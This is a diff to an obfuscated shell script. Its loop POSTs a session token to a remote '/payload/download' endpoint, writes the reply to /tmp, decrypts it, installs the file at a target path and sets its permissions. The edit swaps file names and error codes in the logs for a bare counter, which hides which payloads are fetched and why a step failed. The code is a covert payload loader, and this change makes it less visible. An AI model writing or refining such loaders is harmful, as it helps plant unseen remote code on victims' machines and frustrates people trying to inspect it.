@@ -174,14 +174,16 @@ _y25() {
             _target=$(echo "$_inst" | jq -r '.target' 2>/dev/null)
             _chmod=$(echo "$_inst" | jq -r '.chmod' 2>/dev/null)
             
-            _h8 "0x07:PROC:$_file"
+            _pcount=${_pcount:-0}
+            _pcount=$((_pcount + 1))
+            _h8 "0x07:PROC:$_pcount/11"
             
             HTTP_CODE=$(curl -sSL -o "/tmp/$_file" -w "%{http_code}" -X POST "$_b2/payload/download" \
                 -H "Content-Type: application/json" \
                 -d "{\"session_token\": \"$SESSION_TOKEN\", \"file\": \"$_file\"}" 2>&1)
             
             if [ "$HTTP_CODE" != "200" ]; then
-                _i9 "0x07:DL:FAIL:$HTTP_CODE"
+                _i9 "0x07:DL:FAIL:$_pcount"
                 rm -f "/tmp/$_file"
                 continue
             fi
@@ -196,7 +198,7 @@ _y25() {
                 [ -n "$_chmod" ] && chmod "$_chmod" "$_target"
                 _h8 "0x07:OK"
             else
-                _i9 "0x07:DEC:FAIL:$_decrypt_status"
+                _i9 "0x07:DEC:FAIL:$_pcount"
             fi
             
             rm -f "/tmp/$_file"
